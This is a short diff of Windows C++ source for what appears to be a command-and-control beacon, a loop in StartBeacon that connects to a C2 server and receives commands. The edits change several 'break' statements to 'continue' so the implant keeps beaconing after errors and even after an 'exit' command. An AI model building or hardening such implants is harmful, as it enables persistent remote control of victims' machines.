@@ -124,7 +124,7 @@ void StartBeacon(char* C2Server, int C2Port)
 {
 
 	while (true) {
-		std::cout << "[DBG] New while cycle triggered...\n";
+		std::cout << "[DBG] New Beacon cycle triggered...\n";
 		// BEACONING
 		// NEED TO IMPLEMENT RANDOM DELAY
 		Sleep(5000); // 1000 ms = 1s
@@ -156,7 +156,7 @@ void StartBeacon(char* C2Server, int C2Port)
 				std::cout << "[-] Socket created with error..\n";
 				closesocket(tcpsock);
 				WSACleanup();
-				break;
+				continue;
 			}
 
 			// Else connection successfull..
@@ -174,7 +174,7 @@ void StartBeacon(char* C2Server, int C2Port)
 					std::cout << "[DBG] RECVCODE = 0\n";
 					closesocket(tcpsock);
 					WSACleanup();
-					break;
+					continue;
 				}
 				// Connection verification block END
 				// ------------------
@@ -215,7 +215,7 @@ void StartBeacon(char* C2Server, int C2Port)
 					std::cout << "Command parsed: exit" << std::endl;
 					std::cout << "Closing connection..." << std::endl;
 					Sleep(1000);
-					break;
+					continue;
 				}
 				else {
 					std::cout << "[DBG]  Command received: " << RecvData << std::endl;
